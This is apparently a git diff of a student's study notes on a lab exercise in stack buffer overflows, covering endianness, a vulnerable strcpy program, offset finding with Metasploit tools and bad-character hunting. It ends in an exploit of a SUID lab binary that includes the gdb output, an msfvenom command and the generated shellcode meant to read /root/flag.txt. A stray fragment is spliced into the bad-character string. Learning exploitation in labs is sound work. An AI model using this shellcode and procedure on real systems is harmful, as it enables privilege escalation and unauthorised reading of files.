@@ -38,31 +38,143 @@ I will link the Asembly Module later.
 + __Big endian:__ highest valence -> low address 
 + __Little endian:__ lowest valence -> low address 
 
-- **Example**:
-+ Word: ` \xAA\xBB\xCC\xDD`
-+ Address:  `0xffff0000`
 
-| Memory address | 0xffff0000 | 0xffff0001 | 0xffff0002 | 0xffff0003 |
-|:---:|:---:|:---:|:---:|:---:|
-| Big endian | AA | BB | CC | DD |
-| Lil endian | DD | CC | BB | AA |
+- Example:
++ Word: \xAA\xBB\xCC\xDD 
++ Address: 0xffff0000
 
-# Take control of EIP 
+| Mem address 	| 0xffff0000 	| 0xffff0001 	| 0xffff0002 	| 0xffff0003 	|
+|-------------	|------------	|------------	|------------	|------------	|
+| Big endian  	|     AA     	|     BB     	|     CC     	|     DD     	|
+| Lil endian  	|     DD     	|     CC     	|     BB     	|     AA     	|
 
+# Take control of RIP 
+- First of all, let's look our vulnerable code snippet again. It gets a argument, store inside buffer and print Done message.
+So we can add some "cheeses" to argument by overflow the buffer to `strcpy` function. There are some other not independently protected C functions like `gets`, `sprintf`, `scanf`,...so that `DEP` and `ASLR` should be used for safety. 
+```#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
 
+int bowfunc(char *string) {
 
+	char buffer[1024];
+	strcpy(buffer, string);
+	return 1;
+}
 
+int main(int argc, char *argv[]) {
 
+	bowfunc(argv[1]);
+	printf("Done.\n");
+	return 1;
+}```
 
+- What if we gave the argument the data more than 1024 bytes, let take 1200 bytes.The first 1024 bytes gonna go to buffer, the remain will overflow and stored outside, even overwrite the address of RIP (or whatever its sub register) pushed to stack. Without the DEP, we can inject the shellcode and then when the `ret` called ,shellcode executed. For my OS safety, I use the binary from the module.
 
+#![Alt text](/stack_overflow_check.png "Check if the buffer can be overflow")
+Use the tools from `MSF`,we create a string
+`/usr/share/metasploit-framework/tools/expoit/pattern_create.rb -l 1200 > pattern.txt` 
+ and extract address from `RIP` to determine how many bytes to reach the `RIP`
+`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <address of RIP>`
+In this binary, It took 1040 bytes to reach RIP (actually EIP cuz its i386 architecture)
 
+# Determine the Length for shellcode
+it can be useful to insert some no operation instruction (NOPS) before our shellcode begins so that it can be executed cleanly.
+`NOPS` is "\x90".
 
+# Identification of Bad Characters
+Previously in UNIX-like operating systems, binaries started with two bytes containing a "magic number" that determines the file type. In the beginning, this was used to identify object files for different platforms. They can interfere our shellcode so we have to find all of them and check the shellcode
 
+``CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\execstackf\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" ``
 
+Brick by brick, we check calculate buffer and check bad character from CHARS.
 
+# Generating Shellcode
+After finding all bad characters that can infect the shellcode , just generate the payload with msf-tools, recalculate the buffer
 
+# Identification of the Return Address
+Now with `EIP`, we have to change the 0x66666666 into the address inside NOPS area, so that each cycle, its goes up (since the EIP autopilot increase value) until meet our shellcode. Without `DEP`, we `EIP` will execute the shellcode we inject. Just reminder, use little endian, so the address in gdb have to be modified a lil bit.
 
+# Skill assessment
+## Time to cook the test:
+- The `leave_msg` is exec file that take argument and stored it to `msg.txt`
+- The `msg.txt` is owned by root, and set `SUID` .
+- Object is to get `/root/flag.txt`.
+## Planning:
+So we cant directly modify the `msg.txt` but using `leave_msg`.The `SUID` is set for `msg.txt` so if we somehow inject code to change it into executable file and run `cat /root/flag.txt` command, we __BALL__. 
+## Execute:
+- Try reaching the `EIP` with 2000 `\x55` into argument, still run normally. Buffer gonna be big.
+```(gdb) run $(python -c "print '\x55'*2000 ")
+Starting program: /home/htb-student/leave_msg $(python -c "print '\x55'*2000 ")
+Message left for the administrator.
+```
+- How about 3000 :
+```(gdb) run $(python -c "print '\x55'*3000 ")
+Starting program: /home/htb-student/leave_msg $(python -c "print '\x55'*3000 ")
+Program received signal SIGSEGV, Segmentation fault.
+0x55555555 in ?? ()
+```
+- Time to find EIP with `msf-tools`:
+I created pattern with `pattern_create` with 3000 bytes and get `0x37714336` in `EIP`.Used `pattern_offset` I we have to 2060 (+4) bytes to reach the EIP.
+- The section ask for stack size when we overwrite `EIP`. I have to ask chatbot and we can use `info proc mapping` to check size of stack, heap or both start and end address of them.And my answer is 0x20000 
+- Now we fight the big one. Find the flag.We clear the `msg.txt` first by execute the `leave_msg` with non argument so that we can write the exec code to `msg.txt` and run it to find flag.
+- I plan to exec normally `leave_msg` with the argument ```cat /root/flag.txt``` ,buffer overflow the `leave_msg` to execute `msg.txt`.
+- I need to find all the bad character to generate the shellcode. The CHARS is 256 bytes.\n
+Buffer = 2060-256 = 1804*"'\x55'".\n
+EIP = 4*"'\x66'" 
+- set breakpoint at `leave_msg`, let examine the memory by ``x/2000xb $esp+500 `` 
+```0xffffd5e0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5e8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5f0:     0x55    0x55    0x55    0x55    0x01    0x02    0x03    0x04
+0xffffd5f8:     0x05    0x06    0x07    0x08    0x00    0x0b    0x0c    0x0d
 
+```
+Of courses, classic '\x00' will be removed.
+```
+0xffffd5e0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5e8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5f0:     0x55    0x55    0x55    0x55    0x01    0x02    0x03    0x04
+0xffffd5f8:     0x05    0x06    0x07    0x08    0x00    0x0b    0x0c    0x0d
+```
+Now instead 0x09 we got 0x00. So '\x09' .
+```
+```
+```0xffffd5e8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5f0:     0x55    0x55    0x55    0x55    0x01    0x02    0x03    0x04
+0xffffd5f8:     0x05    0x06    0x07    0x08    0x00    0x0b    0x0c    0x0d
+``
+``
+```
+0x0a is replaced by 0x00. So '\x0a'. Then 0x20 replaced by 0x00. 
+- All bad chars are :"\x00\x09\x0a\x20"
+- We generate payload by `msfvenom`:
+```
+```
+`msfvenom -p linux/x86/exec CMD="/bin/cat</root/flag.txt" --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\20" --out shellcode`
+- Shellcode: 
+``unsigned char buf[] = 
+"\xbf\x81\x42\x4c\xc7\xda\xc6\xd9\x74\x24\xf4\x58\x31\xc9"
+"\xb1\x0f\x83\xc0\x04\x31\x78\x11\x03\x78\x11\xe2\x74\x28"
+"\x47\x9f\xef\xff\x31\x77\x22\x63\x37\x60\x54\x4c\x34\x07"
+"\xa4\xfa\x95\xb5\xcd\x94\x60\xda\x5f\x81\x6b\x1d\x5f\x51"
+"\xa3\x7f\x36\x3f\x94\x1c\xa9\xcb\xd6\xcd\x5b\x5b\x48\x66"
+"\xb4\xc5\xfa\xe7\xad\x27\x77\x90\x45\x38\x20\x33\x2c\xd9"
+"\x03\x33";
+``
+With size of 86 bytes.\nLet's take 1000 bytes as `NOPS` 
+So 2060 - 1000 - 86 = 974 bytes junk ( lets make it '0x55')
+NOPS = 1000 *'\x90' 
+And 4*'\x66' as place holder for return address( gonna point to NOPS)
+Examine the memory ,I take 1 of address in NOP area:'0xffffd2e0'
+So by little endian, It will be '0xe0d2ffff'
+```process 2209 is executing new program: /bin/dash
+/bin/cat: /root/flag.txt: Permission denied
+
+```
+Well we got gatekeeped. But why ??? 
+Asked Grok. It mentioned the `EUID`. 
+- When I execute `leave_msg` ,its `EUID` still 0 (root) since it has `SUID` set. But when I call `/bin/cat` , It create new process that `RealUID` as its `EUID`.So that I cant touch the file.
+Instead of executing cat command, we just generate directly reading file from msfvenom.
 
 
 
